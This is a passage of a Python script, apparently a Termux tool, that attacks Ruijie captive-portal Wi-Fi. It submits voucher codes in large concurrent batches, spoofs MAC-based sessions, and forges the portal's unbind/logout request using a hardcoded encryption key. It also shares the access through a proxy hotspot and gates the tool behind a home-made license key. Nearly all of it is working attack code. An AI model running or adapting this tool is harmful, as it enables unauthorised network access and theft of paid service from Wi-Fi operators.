                            session_id = await get_session_id(session, self.session_url, None, rep_mac=True)
                        tasks.append(login_voucher(session, session_id, voucher, file=self.file, debug=self.debug))
                        if len(tasks) >= self.tasks:
                            await asyncio.gather(*tasks)
                            tasks = []
                    if tasks:
                        await asyncio.gather(*tasks)
            except KeyboardInterrupt:
                print(f"{y}[*] User cancel called")
                sys.exit(0)
            Line()
            print(f"{g}[*] Process is finished")
            sys.exit(0)

class RecheckVoucher:
    def __init__(self):
        self.file = "failed.txt" or "failed7.txt"
        try:
            self.success_code = open("success.txt", "r").read().splitlines()
        except Exception as err:
            print(f"{r}[!] Exit, you didn't have any success code")
            sys.exit(0)
        if len(self.success_code) == 0:
            print(f"{r}[!] Exit, you didn't have any success code")
            sys.exit(0)
        try:
            self.session_url = open(".session_url", "r").read().strip()
        except FileNotFoundError:
            print(f"{r}[!] Sesion url not found try again after setup")
            sys.exit()
    
    async def check(self):
        Logo()
        print(f"{y}[*] Don't stop this program while running")
        Line()
        print(f"{g}[+] The success code recheck program is starting...")
        Line()
        os.remove("success.txt")
        connector = aiohttp.TCPConnector(limit=30)
        timeout = aiohttp.ClientTimeout(total=20)
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                tasks = []
                for loop, voucher in enumerate(self.success_code, start=0):
                    if loop % 90 == 0:
                        session_id = await get_session_id(session, self.session_url, None, rep_mac=True)
                    tasks.append(login_voucher(session, session_id, voucher, file=self.file, check=True))
                    if len(tasks) >= 5:
                        await asyncio.gather(*tasks)
                        tasks = []
                if tasks:
                    await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            print(f"{y}[*] User cancel called")
            sys.exit(0)
        Line()
        print(f"{g}[*] Recheck success voucher code process is finished")

class Setup:
    def __init__(self):
        Logo()
        self.baseurl = "http://10.44.77.240:2060"
        self.username_get_url = self.baseurl + "/username_get"
        self.online_info_url = self.baseurl + "/user/online_info"
        self.logout_url = self.baseurl + "/user/logout"
    
    def set(self):
        print(f"{g}[+] Setting up the wifi info...")
        status = self.unbind()
        Line()
        if not status:
            print(f"{y}[!] Unbinding the wifi failed")
            Line()
        else:
            print(f"{g}[+] Unbinding wifi success")
            time.sleep(6)
            Line()
        print(f"{g}[+] Trying to get info")
        
        try:
            localhost = requests.get("http://192.168.0.1",timeout=10).url
            ip = re.search('gw_address=(.*?)&', localhost).group(1)
            headers = {
                'authority': 'portal-as.ruijienetworks.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'referer': localhost,
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            }
            req = requests.get(localhost, headers=headers).text
            session_url = "https://portal-as.ruijienetworks.com" + re.search("href='(.*?)'</script>", req).group(1)
            open(".session_url", "w").write(session_url)
            open(".ip", "w").write(ip)
            Line()
            print(f"{g}[+] Setup success")
        except Exception as err:
            Line()
            print(f"{r}[!] Setup failed, Error info: {err.__class__.__name__}")
            sys.exit(0)

    def unbind(self):
        username = self.username_get()
        if not username:
            return False
        online_info = self.get_online_info(username)
        if not online_info:
            return False
        data = self.arrange_data(online_info)
        return self.logout(data, username)

    def username_get(self):
        try:
            req = requests.get(self.username_get_url).json()
        except:
            return None
        username = req.get("username", None)
        return username
    
    def get_online_info(self, username):
        params = {
            "username":username,
            "usertype":"wifidog"
        }
        try:
            req = requests.get(self.online_info_url, params=params).json()
        except:
            return None
        try:
            req["data"]["list"][0]
        except IndexError:
            return None
        return req["data"]["list"][0]

    def arrange_data(self, info):
        repmac = info["mac"].replace(":", "")
        repmac = [repmac[i:i+4] for i in range(0, len(repmac), 4)]
        mac_req = ".".join(repmac)
        return {
            "ip":info["ip"],
            "mac":info["mac"],
            "ip_req":info["ip"],
            "mac_req":mac_req
        }

    def get_data(self):
        try:
            req = requests.get(self.baseurl).text
            return req
        except:
            return None

    def extract_chap(self, data):
        match = re.search(r"chap_id=([^&]+)&chap_challenge=([^']+)", data)
        if not match:
            return None
        return {
            "chap_id":match.group(1),
            "chap_challenge":match.group(2)
        }
    
    def encrypt_cryptojs(self, auth, enc_key):
        salt = get_random_bytes(8)
        key_iv = b''
        prev = b''
        while len(key_iv) < 48:
            prev = hashlib.md5(prev + enc_key.encode("utf-8") + salt).digest()
            key_iv += prev
        key = key_iv[:32]
        iv = key_iv[32:48]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        padded_data = pad(auth.encode("utf-8"), AES.block_size)
        cipher_text = cipher.encrypt(padded_data)
        encrypted_data = b"Salted__" + salt + cipher_text
        return base64.b64encode(encrypted_data).decode("utf-8")

    def get_auth(self, username):
        enc_key = "RjYkhwzx$2018!"
        data = self.get_data()
        if not data:
            print(f"{r}[!] Failed to get data, make sure you are connected to the Wi-Fi and try again")
            sys.exit(0)
        chaps = self.extract_chap(data)
        if not chaps:
            print(f"{r}[!] Failed to extract chap_id and chap_challenge, make sure you are connected to the Wi-Fi and try again")
            sys.exit(0)
        chap_id_decoded = urllib.parse.unquote(chaps["chap_id"])
        chap_challenge_decoded = urllib.parse.unquote(chaps["chap_challenge"])
        auth = chap_id_decoded + chap_challenge_decoded + username
        auth_encrypt = self.encrypt_cryptojs(auth, enc_key)
        return auth_encrypt

    def logout(self, data, username):
        auth = self.get_auth(username)
        payload = f"ip={data['ip']}&mac={data['mac']}&ip_req={data['ip_req']}&mac_req={data['mac_req']}&auth={auth}"
        try:
            respond = requests.post(self.logout_url, data=payload).json()
            if respond["success"]:
                return True
        except:
            return False
        
def is_reached_limit(read_):
    try:
        if read_:
            f = open('/data/data/com.termux/files/usr/bin/xrs','r')
        else:
            f = open('/data/data/com.termux/files/usr/bin/xrs','w')
        if read_:
            return bool(f.read())
        else:
            f.write("True")
    except:
        return False
            
def get_random_string(length):
    return ''.join(random.choice(string.digits) for _ in range(length))
    
class Cleaner:
    def __init__(self):
        Logo()
        self.bin_file = self.get_bin()
        print(f"{g}[+] Found {str(len(self.bin_file))} files")
        Line()
        time.sleep(1)
    
    def clean(self):
        if self.bin_file:
            for bin in self.bin_file:
                sys.stdout.write(f"\r{y}[*] Cleaning {bin}...")
                sys.stdout.flush()
                time.sleep(1)
                os.remove(bin)
                sys.stdout.write(f"\r{g}[*] Cleaning {bin}...done\n")
                sys.stdout.flush()
            Line()
            print(f"{g}[+] Clear {str(len(self.bin_file))} files successful")
        else:
            print(f"{y}[*] Nothing file to clean")
    
    def get_bin(self):
        print(f"{y}[*] Checking file to clean...")
        Line()
        bin_file = []
        Bins = ["failed.txt", "failed7.txt", "ascii_lower_bin6.txt", "ascii_lower_bin7.txt", "ascii_upper_bin6.txt", "ascii_upper_bin7.txt", "ascii_bin_mix6.txt", "ascii_bin_mix7.txt"]
        for file in Bins:
            try:
                open(file, "r")
                bin_file.append(file)
            except FileNotFoundError:
                pass
        return bin_file

class Hotspot:
    def __init__(self):
        find_module = importlib.util.find_spec("proxy")
        if find_module is None:
            self.install_module()
        else:
            self.main()
    
    def main(self):
        Logo()
        print(f"{y}[*] Getting device hostname and port...")
        time.sleep(1)
        Line()
        host, port = self.get_hostname()
        print(f"{g}[+] Your device hostname: {host}")
        Line()
        print(f"{g}[+] Your device port: {port}")
        Line()
        print(f"{g}[*] Hotspot device is launched")
        Line()
        sys.stdout.write(f"\r{g}[*] Stop with Control C")
        try:
            subprocess.run(
                ["proxy", "--hostname", "0.0.0.0", "--port", "8080"], stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=True
            )
        except KeyboardInterrupt:
            print(f"\n{y}[*] Process Stoped")
            sys.exit(0)
        except Exception as err:
            print(f"{r}[!] External Error: {err}")
            sys.exit(0)
            os._exit(0)
    
    def get_hostname(self):
        try:
            get = subprocess.run(["ifconfig"], capture_output=True, text=True)
            output = get.stdout[-250:]
            inet = re.search(r'inet\s+([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)', output)
            if inet:
                return inet.group(1), "8080"
        except:
            print(f"{r}[!] Internal Error: code 34")
            sys.exit(0)
            os._exit(0)

    def install_module(self):
        try:
            subprocess.run(
                ["pip", "install", "proxy.py"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=True
            )
        except subprocess.CalledProcessError:
            print(f"{r}[!] Module installation failed, may be you didn't have internet connection")
            sys.exit(0)
            os._exit(0)

class Security:
    def __init__(self):
        Logo()
        self.client_key = getpass.getuser()
    
    def check_key(self):
        now = "None"
        not_reg_key = self.client_key + '&' + 'None' + '&' + "None" + '&' + "None"
        enc_not_reg_key = base64.b16encode(base64.a85encode(not_reg_key.encode())).decode() + ''.join(random.choice(string.digits) for _ in range(12))
        try:
            reg_key = open(".key", "r").read().strip()
            status = self.check_expiration(reg_key, enc_not_reg_key)
            return status
        except FileNotFoundError:
            print(f"{r}[!] Your Key is not registred")
            Line()
            print(f"{g}[*] YOUR KEY: {enc_not_reg_key}")
            sys.exit(0)
    
    def check_expiration(self, reg_key, enc_not_reg_key):
        dec = base64.a85decode(base64.b16decode(reg_key[:-12].encode())).decode()
        key, date, last, active = dec.split("&")
        minute, hour, day, month, year = date.split('|')
        time1 = datetime(year=int(year), month=int(month), day=int(day), hour=int(hour), minute=int(minute))
        time2 = datetime.now()
        difference = time1 - time2
        if key == getpass.getuser() and active == "activated":
            if difference.days < 0:
                print(f"{y}[!] Your key is expired")
                Line()
                print(f"{g}[*] YOUR KEY: {enc_not_reg_key}")
                os.remove(".key")
                sys.exit(0)
            elif difference.days > 31:
                print(f"{r}[!] Are you trying to bypass?")
                sys.exit(0)
        else:
            print(f"{r}[!] Your Key is not registred")
            Line()
            print(f"{g}[*] YOUR KEY: {enc_not_reg_key}")
            sys.exit(0)
        if last != 'None':
            lminute, lhour, lday, lmonth, lyear = last.split('/')
            ltime = datetime(
                year=int(lyear),
                month=int(lmonth),
                day=int(lday),
                hour=int(lhour),
                minute=int(lminute)
            )
            if datetime.now() < ltime:
                print(f"{r}[!] Are you trying to bypass?")
                sys.exit(0)
            now = datetime.now()
            lcheck = f"{now.minute}/{now.hour}/{now.day}/{now.month}/{now.year}"
            lkey = key + '&' + date + '&' + lcheck + '&' + active
            enc_lkey = (
                base64.b16encode(base64.a85encode(lkey.encode())).decode()
                + ''.join(random.choice(string.digits) for _ in range(12))
            )
            with open('.key', 'w') as f:
                f.write(enc_lkey)
            return True
        else:
            now = datetime.now()
            lcheck = str(now.minute) + '/' + str(now.hour) + '/' + str(now.day) + '/' + str(now.month) + '/' + str(now.year)
            lkey = key + '&' + date + '&' + lcheck + '&' + active
            enc_lkey = base64.b16encode(base64.a85encode(lkey.encode())).decode() + ''.join(random.choice(string.digits) for _ in range(12))
            with open('.key','w') as f:
                f.write(enc_lkey)
            return True
feature()
